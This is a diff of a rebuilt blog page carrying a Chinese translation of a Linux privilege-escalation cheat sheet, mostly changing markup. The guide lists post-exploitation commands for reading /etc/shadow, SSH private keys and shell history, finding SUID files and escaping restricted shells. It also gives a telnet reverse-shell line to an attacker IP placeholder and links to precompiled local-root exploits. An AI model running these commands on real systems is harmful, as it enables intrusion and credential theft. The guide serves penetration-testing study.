@@ -5,6 +5,9 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
 
     <title>Linux提权指南 | 码中春秋&#39;s Blog</title>
     <meta property="og:title" content="Linux提权指南 - 码中春秋&#39;s Blog">
@@ -20,15 +23,16 @@
         
     <meta name="author" content="码中春秋">
     <meta property="og:url" content="https://blog.taielab.com/2018-04-01/linux-getshell-guide.html">
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
 
     <link rel="stylesheet" href='/css/normalize.css'>
     <link rel="stylesheet" href='/css/style.css'>
-    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
     
-
-
+    
+    
+    
     
     
         <link rel="stylesheet" href='/css/douban.css'>
@@ -36,7 +40,6 @@
         <link rel="stylesheet" href='/css/other.css'>
     
 </head>
-
 
 <body>
     <header id="header" class="clearfix">
@@ -54,7 +57,7 @@
                 <nav id="nav-menu" class="clearfix">
                     <a class="current" href="https://blog.taielab.com">首页</a>
                     
-                    <a  href="https://blog.taielab.com/archives/" title="存档">存档</a>
+                    <a  href="https://blog.taielab.com/archives/" title="归档">归档</a>
                     
                     <a  href="https://blog.taielab.com/about/" title="关于">关于</a>
                     
@@ -186,8 +189,8 @@
         var postToc = $(".post-toc");
         if (postToc.length) {
             var leftPos = $("#main").offset().left;
-            if(leftPos<220){
-                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            if (leftPos < 220) {
+                postToc.css({ "width": leftPos - 10, "margin-left": (0 - leftPos) })
             }
 
             var t = postToc.offset().top - 20,
@@ -206,6 +209,10 @@
                 e < t ? postToc.css(a.start) : postToc.css(a.process)
             })
         }
+
+        if ($("#TableOfContents").children().length < 1) {
+            $(".post-toc").remove();
+        }
     })
 </script>
     <article class="post">
@@ -219,7 +226,7 @@
         <div class="post-meta">
             <span>|</span>
             
-            <span class="meta-category"><a href='https://blog.taielab.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8'>网络安全</a></span>
+            <span class="meta-category"><a href='/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8'>网络安全</a></span>
             
         </div>
         
@@ -242,19 +249,19 @@
 <p>希望本指南能为新手和想进一步学习没有关注到这些小细节的朋友提供良好的视角。</p>
 <h2 id="操作系统">操作系统</h2>
 <h4 id="什么发行版什么版本">什么发行版？<em>什么版本？</em></h4>
-<pre><code>cat /etc/issue
+<pre tabindex="0"><code>cat /etc/issue
 cat /etc/*-release
   cat /etc/lsb-release      # Debian based
   cat /etc/redhat-release   # Redhat based
 </code></pre><h4 id="内核版本多少-是64-bit">内核版本多少? <em>是64-bit?</em></h4>
-<pre><code>cat /proc/version
+<pre tabindex="0"><code>cat /proc/version
 uname -a
 uname -mrs
 rpm -q kernel
 dmesg | grep Linux
 ls /boot | grep vmlinuz-
 </code></pre><p>从环境变量可以得到什么?</p>
-<pre><code>cat /etc/profile
+<pre tabindex="0"><code>cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
 cat ~/.bashrc
@@ -262,25 +269,25 @@ cat ~/.bash_logout
 env
 set
 </code></pre><p>有打印机吗？</p>
-<pre><code>lpstat -a
+<pre tabindex="0"><code>lpstat -a
 </code></pre><h2 id="应用程序和服务">应用程序和服务</h2>
 <h4 id="哪些服务正在运行哪个服务有哪个用户权限">哪些服务正在运行？<em>哪个服务有哪个用户权限？</em></h4>
-<pre><code>ps aux
+<pre tabindex="0"><code>ps aux
 ps -ef
 top
 cat /etc/services
 </code></pre><h4 id="哪些服务由root运行这些服务可能有缺陷---可以再次审查">哪些服务由<em>root</em>运行*？这些服务可能有缺陷 - 可以再次审查！*</h4>
-<pre><code>ps aux | grep root
+<pre tabindex="0"><code>ps aux | grep root
 ps -ef | grep root
 </code></pre><h4 id="安装了什么应用程序版本多少正在运行吗">安装了什么应用程序？<em>版本多少？正在运行吗？</em></h4>
-<pre><code>ls -alh /usr/bin/
+<pre tabindex="0"><code>ls -alh /usr/bin/
 ls -alh /sbin/
 dpkg -l
 rpm -qa
 ls -alh /var/cache/apt/archivesO
 ls -alh /var/cache/yum/
 </code></pre><h4 id="有服务设置配置错误是否有易受攻击的插件">有服务设置配置错误？<em>是否有（易受攻击的）插件？</em></h4>
-<pre><code>cat /etc/syslog.conf
+<pre tabindex="0"><code>cat /etc/syslog.conf
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
 cat /etc/cups/cupsd.conf
@@ -289,9 +296,9 @@ cat /etc/apache2/apache2.conf
 cat /etc/my.conf
 cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
-ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/
 </code></pre><h4 id="有哪些任务计划">有哪些任务计划？</h4>
-<pre><code>crontab -l
+<pre tabindex="0"><code>crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
 ls -al /etc/cron*
@@ -304,24 +311,24 @@ cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 </code></pre><h4 id="有纯文本的用户名和或密码吗">有纯文本的用户名和/或密码吗?</h4>
-<pre><code>grep -i user [filename]
+<pre tabindex="0"><code>grep -i user [filename]
 grep -i pass [filename]
-grep -C 5 &quot;password&quot; [filename]
-find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla
+grep -C 5 &#34;password&#34; [filename]
+find . -name &#34;*.php&#34; -print0 | xargs -0 grep -i -n &#34;var $password&#34;   # Joomla
 </code></pre><h2 id="通信与网络">通信与网络</h2>
 <h4 id="系统有哪些网卡它连接到另一个网络">系统有哪些网卡？<em>它连接到另一个网络？</em></h4>
-<pre><code>/sbin/ifconfig -a
+<pre tabindex="0"><code>/sbin/ifconfig -a
 cat /etc/network/interfaces
 cat /etc/sysconfig/network
 </code></pre><h4 id="网络配置设置是什么你能找到关于这个网络的服务吗dhcp服务器dns服务器网关">网络配置设置是什么？<em>你能找到关于这个网络的服务吗？DHCP服务器？DNS服务器？网关？</em></h4>
-<pre><code>cat /etc/resolv.conf
+<pre tabindex="0"><code>cat /etc/resolv.conf
 cat /etc/sysconfig/network
 cat /etc/networks
 iptables -L
 hostname
 dnsdomainname
 </code></pre><h4 id="还有哪些用户和主机正在与系统进行通信">还有哪些用户和主机正在与系统进行通信？</h4>
-<pre><code>lsof -i
+<pre tabindex="0"><code>lsof -i
 lsof -i :80
 grep 80 /etc/services
 netstat -antup
@@ -332,21 +339,21 @@ chkconfig --list | grep 3:on
 last
 w
 </code></pre><h4 id="缓存是什么ip和或mac地址">缓存是什么？<em>IP和/或MAC地址</em></h4>
-<pre><code>arp -e
+<pre tabindex="0"><code>arp -e
 route
 /sbin/route -nee
 </code></pre><h4 id="数据包嗅探可能吗可以看到什么监听通信流">数据包嗅探可能吗？可以看到什么？<em>监听通信流</em></h4>
-<pre><code>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
+<pre tabindex="0"><code>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
 </code></pre><p>用法:</p>
-<pre><code>tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+<pre tabindex="0"><code>tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 </code></pre><h4 id="你有shell吗你能和系统交互吗">你有shell吗？<em>你能和系统交互吗？</em></h4>
-<pre><code>nc -lvp 4444    # Attacker. Input (Commands)
+<pre tabindex="0"><code>nc -lvp 4444    # Attacker. Input (Commands)
 nc -lvp 4445    # Attacker. Ouput (Results)
 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # 在靶机上. 使用攻击者的IP!
 
 http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
 </code></pre><p>端口转发可能吗？重定向并与另一个视图的流量进行交互</p>
-<pre><code>注意：http : //www.boutell.com/rinetd/
+<pre tabindex="0"><code>注意：http : //www.boutell.com/rinetd/
 
 注意：http：//www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
 
@@ -379,40 +386,40 @@ ssh -D 127.0.0.1:9050 -N [username]@[ip]
 proxychains ifconfig
 </code></pre><h2 id="重要信息和用户信息">重要信息和用户信息</h2>
 <h4 id="你是谁谁登录谁已经登录那里还有谁谁可以做什么">你是谁？谁登录？谁已经登录？那里还有谁？谁可以做什么？</h4>
-<pre><code>id
+<pre tabindex="0"><code>id
 who
 w
 last
 cat /etc/passwd | cut -d: -f1    # List of users
-grep -v -E &quot;^#&quot; /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
-awk -F: '($3 == &quot;0&quot;) {print}' /etc/passwd   # List of super users
+grep -v -E &#34;^#&#34; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # List of super users
+awk -F: &#39;($3 == &#34;0&#34;) {print}&#39; /etc/passwd   # List of super users
 cat /etc/sudoers
 sudo -l
 </code></pre><h4 id="哪些敏感文件可以找到">哪些敏感文件可以找到？</h4>
-<pre><code>cat /etc/passwd
+<pre tabindex="0"><code>cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
 </code></pre><h4 id="root和home目录有什么有趣的东西如果可以访问">root和home目录有什么“有趣”的东西？<em>如果可以访问</em></h4>
-<pre><code>ls -ahlR /root/
+<pre tabindex="0"><code>ls -ahlR /root/
 ls -ahlR /home/
 </code></pre><h4 id="有没有密码脚本数据库配置文件或日志文件密码的默认路径和位置">有没有密码？脚本，数据库，配置文件或日志文件？<em>密码的默认路径和位置</em></h4>
-<pre><code>cat /var/apache2/config.inc
+<pre tabindex="0"><code>cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
 </code></pre><h4 id="用户在做什么有纯文本密码吗他们在编辑什么">用户在做什么？<em>有纯文本密码吗？他们在编辑什么？</em></h4>
-<pre><code>cat ~/.bash_history
+<pre tabindex="0"><code>cat ~/.bash_history
 cat ~/.nano_history
 cat ~/.atftp_history
 cat ~/.mysql_history
 cat ~/.php_history
 </code></pre><h4 id="可以找到哪些用户信息">可以找到哪些用户信息？</h4>
-<pre><code>cat ~/.bashrc
+<pre tabindex="0"><code>cat ~/.bashrc
 cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
 </code></pre><h4 id="可以找到私钥信息吗">可以找到私钥信息吗？</h4>
-<pre><code>cat ~/.ssh/authorized_keys
+<pre tabindex="0"><code>cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
 cat ~/.ssh/id_rsa.pub
@@ -429,15 +436,15 @@ cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 </code></pre><h2 id="文件系统">文件系统</h2>
 <h4 id="哪些配置文件可以写入-etc-能够重新配置服务">哪些配置文件可以写入/ etc /？<em>能够重新配置服务？</em></h4>
-<pre><code>ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2&gt;/dev/null     # Anyone
-ls -aRl /etc/ | awk '$1 ~ /^..w/' 2&gt;/dev/null       # Owner
-ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2&gt;/dev/null    # Group
-ls -aRl /etc/ | awk '$1 ~ /w.$/' 2&gt;/dev/null        # Other
+<pre tabindex="0"><code>ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null     # Anyone
+ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null       # Owner
+ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null    # Group
+ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null        # Other
 
 find /etc/ -readable -type f 2&gt;/dev/null               # Anyone
 find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone
 </code></pre><h4 id="什么可以在-var-中找到">什么可以在/ var /中找到？</h4>
-<pre><code>ls -alh /var/log
+<pre tabindex="0"><code>ls -alh /var/log
 ls -alh /var/mail
 ls -alh /var/spool
 ls -alh /var/spool/lpd
@@ -445,13 +452,13 @@ ls -alh /var/lib/pgsql
 ls -alh /var/lib/mysql
 cat /var/lib/dhcp3/dhclient.leases
 </code></pre><h4 id="网站上的任何设置文件隐藏任何设置文件与数据库信息">网站上的任何设置/文件（隐藏）？<em>任何设置文件与数据库信息？</em></h4>
-<pre><code>ls -alhR /var/www/
+<pre tabindex="0"><code>ls -alhR /var/www/
 ls -alhR /srv/www/htdocs/
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/
 ls -alhR /var/www/html/
 </code></pre><p>日志文件中是否有任何内容*（可以帮助“本地文件包括”！）*</p>
-<pre><code>cat /etc/httpd/logs/access_log
+<pre tabindex="0"><code>cat /etc/httpd/logs/access_log
 cat /etc/httpd/logs/access.log
 cat /etc/httpd/logs/error_log
 cat /etc/httpd/logs/error.log
@@ -493,56 +500,49 @@ ls -alh /var/log/samba/
 注意: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
 注意：http://www.thegeekstuff.com/2011/08/linux-var-log-files/
 </code></pre><h4 id="如果命令是有限的你突破了jailshell">如果命令是有限的，你突破了“jail”shell？</h4>
-<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
-echo os.system('/bin/bash')
+<pre tabindex="0"><code>python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+echo os.system(&#39;/bin/bash&#39;)
 /bin/sh -i
 </code></pre><h4 id="如何挂载文件系统">如何挂载文件系统？</h4>
-<pre><code>mount
+<pre tabindex="0"><code>mount
 df -h
-
 </code></pre><h4 id="有没有卸载的文件系统">有没有卸载的文件系统？</h4>
-<pre><code>cat /etc/fstab
-
+<pre tabindex="0"><code>cat /etc/fstab
 </code></pre><h4 id="什么高级linux文件权限被使用sticky-bitssuid和guid">什么“高级Linux文件权限”被使用？<em>Sticky bits</em>，SUID和GUID*</h4>
-<pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+<pre tabindex="0"><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
 find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
 find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
 
 find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
-for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+for i in `locate -r &#34;bin$&#34;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
 
 # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
-
 </code></pre><h4 id="哪里可以写入和执行一些常见的地方-tmp-var--tmp-dev--shm">哪里可以写入和执行？<em>一些“常见”的地方：/ tmp，/ var / tmp，/ dev / shm</em></h4>
-<pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders
+<pre tabindex="0"><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders
 find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders
 find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders
 
 find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders
 
 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders
-
 </code></pre><h4 id="有问题文件可写的无人文件">有“问题”文件？<em>可写的“无人”文件</em></h4>
-<pre><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+<pre tabindex="0"><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
 find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
-
 </code></pre><h2 id="准备和查找利用代码">准备和查找利用代码</h2>
 <h4 id="什么开发工具安装了什么编程语言支持">什么开发工具/安装了什么编程语言/支持？</h4>
-<pre><code>find / -name perl*
+<pre tabindex="0"><code>find / -name perl*
 find / -name python*
 find / -name gcc*
 find / -name cc
-
 </code></pre><h4 id="如何上传文件">如何上传文件？</h4>
-<pre><code>find / -name wget
+<pre tabindex="0"><code>find / -name wget
 find / -name nc*
 find / -name netcat*
 find / -name tftp*
 find / -name ftp
-
 </code></pre><h4 id="寻找漏洞利用代码">寻找漏洞利用代码</h4>
-<pre><code>http://www.exploit-db.com
+<pre tabindex="0"><code>http://www.exploit-db.com
 
 http://1337day.com
 
@@ -559,34 +559,29 @@ http://securityreason.com
 http://seclists.org/fulldisclosure/
 
 http://www.google.com
-
-
 </code></pre><h4 id="寻找更多关于漏洞利用的信息">寻找更多关于漏洞利用的信息</h4>
-<pre><code>http://www.cvedetails.com
+<pre tabindex="0"><code>http://www.cvedetails.com
 
 http://packetstormsecurity.org/files/cve/[CVE]
 
 http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
 
 http://www.vulnview.com/cve-details.php?cvename=[CVE]
-
 </code></pre><h4 id="快速常见漏洞预编译的二进制文件使用风险自负">（快速）“常见”漏洞。<em>预编译的二进制文件。使用风险自负</em></h4>
-<pre><code>http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/
+<pre tabindex="0"><code>http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/
 
 http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
-
 </code></pre><h2 id="缓解措施">缓解措施</h2>
 <h4 id="上述任何信息是否容易找到">上述任何信息是否容易找到？</h4>
 <p>试试吧！设置一个自动执行脚本和/或第三方的cron作业</p>
 <h4 id="系统是否完全修补">系统是否完全修补？</h4>
 <p><em>内核，操作系统，所有应用程序，插件和Web服务</em></p>
-<pre><code>apt-get update &amp;&amp; apt-get upgrade
+<pre tabindex="0"><code>apt-get update &amp;&amp; apt-get upgrade
 yum update
-
 </code></pre><h4 id="服务是否以最低级别的特权运行">服务是否以最低级别的特权运行？</h4>
 <p>例如，你需要以root身份运行MySQL吗？</p>
 <h4 id="脚本可以自动化">脚本<em>可以自动化？！</em></h4>
-<pre><code>http://pentestmonkey.net/tools/unix-privesc-check/
+<pre tabindex="0"><code>http://pentestmonkey.net/tools/unix-privesc-check/
 
 https://github.com/mzet-/linux-exploit-suggester
 
@@ -595,20 +590,17 @@ http://labs.portcullis.co.uk/application/enum4linux/
 http://bastille-linux.sourceforge.net
 
 https://github.com/SecWiki/linux-kernel-exploits
-
 </code></pre><h2 id="其他快速指南和链接">其他（快速）指南和链接</h2>
 <h4 id="列举">列举</h4>
-<pre><code>http://www.0daysecurity.com/penetration-testing/enumeration.html
+<pre tabindex="0"><code>http://www.0daysecurity.com/penetration-testing/enumeration.html
 
 http://www.microloft.co.uk/hacking/hacking3.htm
-
 </code></pre><h4 id="其他">其他</h4>
-<pre><code>http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf
+<pre tabindex="0"><code>http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf
 
 http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf
 
 http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
-
 </code></pre><blockquote>
 <p>翻译自：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
 </blockquote>
@@ -642,20 +634,39 @@ http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
             
             <ul class="clearfix">
                 
-                <li><a href='https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F'>内网渗透</a></li>
+                <li><a href='/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F'>内网渗透</a></li>
                 
             </ul>
             
         </div>
     </article>
     
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
     
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
 
     
     
     <div class="post bg-white">
       <script src="https://utteranc.es/client.js"
-            repo= "udpsec/blog-comments"
+            repo= "taielab"
             issue-term="pathname"
             theme="github-light"
             crossorigin="anonymous"
@@ -663,13 +674,47 @@ http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
       </script>
     </div>
     
+    
+    
+
 </div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2022 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>
+        
+    </div>
+    <br />
+
+</footer>
+
+
+    
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+    <script src='/js/douban.js'></script>
 
                 </div>
 
                 <div id="secondary">
     <section class="widget">
-        <form id="search" action='https://blog.taielab.com/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+        <form id="search" action='https://blog.taielab.com/search' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
       
       <input type="text" name="q" maxlength="20" placeholder="Search">
       <input type="hidden" name="sitesearch" value="https://blog.taielab.com">
@@ -737,28 +782,12 @@ http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
             </a>
         </li>
         
-        <li>
-            <a href="" title="" target="_blank" style="color:red">
-                
-                    
-                
-            </a>
-        </li>
-        
-        <li>
-            <a href="" title="" target="_blank" style="color:red">
-                
-                    
-                
-            </a>
-        </li>
-        
     </ul>
 </section>
 
 
     <section class="widget">
-        <h3 class="widget-title">分类</h3>
+        <h3 class="widget-title"><a href='/categories/'>分类</a></h3>
 <ul class="widget-list">
     
     <li><a href="https://blog.taielab.com/categories/Android%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8/">Android应用逆向与安全 (1)</a></li>
@@ -797,7 +826,7 @@ http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
     </section>
 
     <section class="widget">
-        <h3 class="widget-title">标签</h3>
+        <h3 class="widget-title"><a href='/tags/'>标签</a></h3>
 <div class="tagcloud">
     
     <a href="https://blog.taielab.com/tags/Android/">Android</a>
@@ -877,7 +906,7 @@ http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
     <ul class="widget-list">
         
         <li>
-            <a target="_blank" href="#" title=""></a>
+            <a target="_blank" href="" title=""></a>
         </li>
         
     </ul>
@@ -894,51 +923,6 @@ http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html
             </div>
         </div>
     </div>
-    <footer id="footer">
-    <div class="container">
-        &copy; 2020 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>.
-        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
-        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/flysnow-org/maupassant-hugo" target="_blank">maupassant</a>.
-        
-    </div>
-</footer>
-
-
-    
-    <script type="text/javascript">
-        window.MathJax = {
-            tex2jax: {
-                inlineMath: [['$', '$']],
-                processEscapes: true
-                }
-            };
-    </script>
-    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
-
-
-<a id="rocket" href="#top"></a>
-<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'GA ID', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
-
-    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-
-
-
-
-    <script src='/js/douban.js'></script>
-
 </body>
 
 </html>
